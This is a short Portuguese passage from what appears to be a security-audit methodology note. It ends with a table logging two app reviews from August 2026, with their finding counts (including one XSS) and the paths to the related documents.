   novas, incluindo duas no código escrito horas antes. Correção é código novo; código novo
   não foi auditado.

---

## Aplicado em

| app | data | achados | onde |
|---|---|---|---|
| **Órbita** | 2026-08-06 (1ª passada) | 5 altos + 5 médios/baixos | `DRAMASYNC/docs/adr/0012-postura-de-seguranca.md` |
| **Órbita** | 2026-08-06 (2ª, adversária) | +6, dois deles na correção do mesmo dia | idem, seção "Segunda passada" |
| **De Lá Pra Cá** | 2026-08-16 (contra o Guia da Emissora) | 1 XSS real (item 11b), lockfile ausente, modelagem STRIDE inexistente | `_DeLaPraCa/modelagens/pos-producao/delapraca-mc/` |
